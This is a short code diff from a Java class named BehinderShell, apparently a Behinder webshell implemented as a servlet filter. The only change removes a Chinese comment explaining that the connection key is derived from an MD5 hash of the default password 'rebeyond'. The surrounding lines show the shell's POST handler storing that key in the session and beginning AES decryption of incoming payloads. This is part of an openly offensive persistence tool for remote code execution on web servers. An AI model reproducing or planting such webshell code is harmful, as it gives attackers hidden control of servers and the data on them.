@@ -29,7 +29,7 @@ public class BehinderShell extends ClassLoader implements Filter, Servlet, Servl
     public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws IOException, ServletException {
         HttpServletRequest req = (HttpServletRequest) request;
         if (req.getMethod().equals("POST")){
-            String k = password;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
+            String k = password;
             req.getSession().putValue("u",k);
             try {
                 Cipher c=Cipher.getInstance("AES");
